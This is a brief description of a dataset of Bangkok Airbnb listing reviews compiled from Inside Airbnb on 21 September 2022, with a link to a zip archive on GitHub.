...
The dataset contains the detailed review data for listings in Bangkok compiled on 21 Sep, 2022. The data are from the Inside Airbnb site, it is sourced from publicly available information, from the Airbnb site. The data has been analyzed, cleansed and aggregated where appropriate to faciliate public discussion. More on this data, and other similar data refers to this (https://raw.githubusercontent.com/rohitsha0410/airbnb_sentimental_analysis/main/predecay/analysis_airbnb_sentimental_1.6.zip)
